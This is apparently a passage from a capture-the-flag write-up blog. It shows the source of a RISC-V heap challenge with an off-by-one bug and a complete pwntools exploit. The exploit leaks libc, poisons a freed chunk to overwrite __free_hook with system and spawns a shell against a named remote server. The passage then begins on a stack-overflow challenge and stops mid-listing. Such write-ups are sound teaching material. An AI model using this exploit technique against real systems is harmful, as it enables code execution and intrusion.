<span class="token keyword">void</span> <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    std<span class="token punctuation">:</span><span class="token punctuation">:</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"code:"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        std<span class="token punctuation">:</span><span class="token punctuation">:</span>cin <span class="token operator">>></span> a<span class="token punctuation">;</span> 
        <span class="token keyword">switch</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token function">del</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span> <span class="token function">modify</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">default</span><span class="token punctuation">:</span> 
                <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"code err:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    size_t size <span class="token operator">=</span> <span class="token number">0xe8</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> idx<span class="token punctuation">;</span>
    std<span class="token punctuation">:</span><span class="token punctuation">:</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"idx:"</span><span class="token punctuation">;</span>
    std<span class="token punctuation">:</span><span class="token punctuation">:</span>cin <span class="token operator">>></span> idx<span class="token punctuation">;</span>
    pname<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> new <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    std<span class="token punctuation">:</span><span class="token punctuation">:</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"name:"</span> <span class="token operator">&lt;&lt;</span> std<span class="token punctuation">:</span><span class="token punctuation">:</span>endl<span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> pname<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    plist<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
    std<span class="token punctuation">:</span><span class="token punctuation">:</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"msg:"</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> size<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> plist<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">+</span> i<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>plist<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">del</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">int</span> idx<span class="token punctuation">;</span>
    std<span class="token punctuation">:</span><span class="token punctuation">:</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"idx:"</span><span class="token punctuation">;</span>
    std<span class="token punctuation">:</span><span class="token punctuation">:</span>cin <span class="token operator">>></span> idx<span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>plist<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">==</span> nullptr<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">free</span><span class="token punctuation">(</span>plist<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    delete<span class="token punctuation">[</span><span class="token punctuation">]</span> pname<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
    pname<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> nullptr<span class="token punctuation">;</span>
    plist<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> nullptr<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">int</span> idx<span class="token punctuation">;</span>    
    std<span class="token punctuation">:</span><span class="token punctuation">:</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"idx:"</span><span class="token punctuation">;</span>
    std<span class="token punctuation">:</span><span class="token punctuation">:</span>cin <span class="token operator">>></span> idx<span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>plist<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">==</span> nullptr<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        std<span class="token punctuation">:</span><span class="token punctuation">:</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"err"</span> <span class="token operator">&lt;&lt;</span> std<span class="token punctuation">:</span><span class="token punctuation">:</span>endl<span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    std<span class="token punctuation">:</span><span class="token punctuation">:</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"msg:"</span> <span class="token operator">&lt;&lt;</span> plist<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> std<span class="token punctuation">:</span><span class="token punctuation">:</span>endl<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">modify</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">int</span> idx<span class="token punctuation">;</span>
    std<span class="token punctuation">:</span><span class="token punctuation">:</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"idx:"</span><span class="token punctuation">;</span>
    std<span class="token punctuation">:</span><span class="token punctuation">:</span>cin <span class="token operator">>></span> idx<span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>plist<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">==</span> nullptr<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    std<span class="token punctuation">:</span><span class="token punctuation">:</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"msg:"</span><span class="token punctuation">;</span>
    size_t size <span class="token operator">=</span> <span class="token number">0xf8</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> plist<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">+</span> i<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>plist<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>
<span class="token comment" spellcheck="true"># Author: i0gan</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> os
r   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ra  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
rl  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
s   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
ia  <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
c   <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
li    <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>

context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
<span class="token comment" spellcheck="true">#context.arch='em_riscv-64-little'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>

elf_path  <span class="token operator">=</span> <span class="token string">'./honorbook'</span>
<span class="token comment" spellcheck="true">#libc_path = '/glibc/2.23/64/lib/libc.so.6'</span>
libc_path <span class="token operator">=</span> <span class="token string">'libs/lib/libc.so.6'</span>

<span class="token comment" spellcheck="true"># remote server ip and port</span>
server_ip <span class="token operator">=</span> <span class="token string">"121.36.192.114"</span>
server_port <span class="token operator">=</span> <span class="token number">9999</span>

<span class="token comment" spellcheck="true"># if local debug</span>
LOCAL <span class="token operator">=</span> <span class="token number">1</span>
LIBC  <span class="token operator">=</span> <span class="token number">1</span>
<span class="token comment" spellcheck="true">#--------------------------func-----------------------------</span>
<span class="token keyword">def</span> <span class="token function">db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>LOCAL<span class="token punctuation">)</span><span class="token punctuation">:</span>
        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">ad</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> n<span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># max 0x18</span>
    sa<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># max 0xE9</span>

<span class="token keyword">def</span> <span class="token function">rm</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">dp</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">md</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># max 0xE9</span>

<span class="token comment" spellcheck="true">#--------------------------exploit--------------------------</span>
<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    li<span class="token punctuation">(</span><span class="token string">'exploit...'</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># name -> size == 0x30</span>
    <span class="token comment" spellcheck="true"># body -> size == 0x100</span>

    <span class="token comment" spellcheck="true">#ad(0, 'A' * 0x18, 'D' * 0xE9)</span>
    <span class="token comment" spellcheck="true"># leak libc</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        ad<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        rm<span class="token punctuation">(</span><span class="token number">7</span> <span class="token operator">-</span> i<span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        ad<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>
    ad<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'AAAAAAA\n'</span><span class="token punctuation">)</span>
    dp<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>

    ru<span class="token punctuation">(</span><span class="token string">'AA\n'</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#libc.sym['__malloc_hook']</span>
    leak <span class="token operator">=</span> u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    libc_base <span class="token operator">=</span> <span class="token number">0x4000000000</span> <span class="token operator">+</span> leak <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">88</span> <span class="token operator">-</span> <span class="token number">0x10</span>

    system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
    __free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>

    rm<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    rm<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    ad<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0xe8</span> <span class="token operator">+</span> <span class="token string">'\xf1'</span><span class="token punctuation">)</span>
    rm<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span>  b<span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">0x20</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>__free_hook<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> b<span class="token string">'\n'</span>
    ad<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>

    li<span class="token punctuation">(</span><span class="token string">'leak: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>leak<span class="token punctuation">)</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'libc_base: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'free_hook: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>__free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'system: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>

    ad<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00\n'</span><span class="token punctuation">)</span>
    ad<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string">'\n'</span><span class="token punctuation">)</span>
    rm<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">finish</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
    c<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#--------------------------main-----------------------------</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> LOCAL<span class="token punctuation">:</span>
        <span class="token keyword">if</span> LIBC<span class="token punctuation">:</span>
            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libc_path<span class="token punctuation">)</span>
            <span class="token comment" spellcheck="true">#io = elf.process(env = {"LD_PRELOAD" : libc_path} )</span>
            io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'./qemu-riscv64'</span><span class="token punctuation">,</span> <span class="token string">'-L'</span> <span class="token punctuation">,</span> <span class="token string">'./libs'</span><span class="token punctuation">,</span> elf_path<span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token comment" spellcheck="true">#io = process(['/usr/bin/qemu-riscv64-static', '-g', '1235', '-L' , './libs', elf_path])</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token comment" spellcheck="true">#io = elf.process()</span>
            <span class="token comment" spellcheck="true">#io = process(['./qemu-riscv64', '-L' , './libs', elf_path])</span>
            io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'/usr/bin/qemu-riscv64-static'</span><span class="token punctuation">,</span> <span class="token string">'-g'</span><span class="token punctuation">,</span> <span class="token string">'1234'</span><span class="token punctuation">,</span> <span class="token string">'-L'</span> <span class="token punctuation">,</span> <span class="token string">'./libs'</span><span class="token punctuation">,</span> elf_path<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>server_ip<span class="token punctuation">,</span> server_port<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIBC<span class="token punctuation">:</span>
            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libc_path<span class="token punctuation">)</span>
    exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    finish<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h1 id="HUAWEI-XCTF-2020-Third"><a href="#HUAWEI-XCTF-2020-Third" class="headerlink" title="HUAWEI XCTF 2020 Third"></a>HUAWEI XCTF 2020 Third</h1><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><h3 id="checksec-1"><a href="#checksec-1" class="headerlink" title="checksec"></a>checksec</h3><pre><code>    Arch:     em_riscv-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x10000)
    RWX:      Has RWX segments</code></pre>
<p>It’s a riscv-64 arch, We have to use latest ghidra decompilier to annalize this program, version as: 9.21</p>
<h3 id="vul"><a href="#vul" class="headerlink" title="vul"></a>vul</h3><p>In echo function, there is a stackoverflow vulnerability.</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">echo</span><span class="token punctuation">(</span>longlong param_1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  longlong lVar1<span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>ppcVar2<span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>pcVar3<span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>__s2<span class="token punctuation">;</span>
  <span class="token keyword">int</span> iVar4<span class="token punctuation">;</span>
  ssize_t sVar5<span class="token punctuation">;</span>
  undefined4 extraout_var<span class="token punctuation">;</span>
  undefined4 extraout_var_00<span class="token punctuation">;</span>
  undefined4 extraout_var_01<span class="token punctuation">;</span>
  size_t __nbytes<span class="token punctuation">;</span>
  longlong lVar6<span class="token punctuation">;</span>
  undefined auStack320 <span class="token punctuation">[</span><span class="token number">264</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  lVar1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>longlong <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  pcVar3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>lVar1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  iVar4 <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>pcVar3<span class="token punctuation">,</span><span class="token string">">"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">CONCAT44</span><span class="token punctuation">(</span>extraout_var<span class="token punctuation">,</span>iVar4<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    lVar6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token punctuation">{</span>
    iVar4 <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>pcVar3<span class="token punctuation">,</span><span class="token string">">>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    lVar6 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">CONCAT44</span><span class="token punctuation">(</span>extraout_var_00<span class="token punctuation">,</span>iVar4<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token comment" spellcheck="true">/* WARNING: Subroutine does not return*/</span>
      <span class="token function">error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  pcVar3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>lVar1 <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  ppcVar2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>gp0xfffffffffffffa60<span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__s2 <span class="token operator">=</span> <span class="token operator">*</span>ppcVar2<span class="token punctuation">,</span> __s2 <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span> <span class="token operator">||</span>
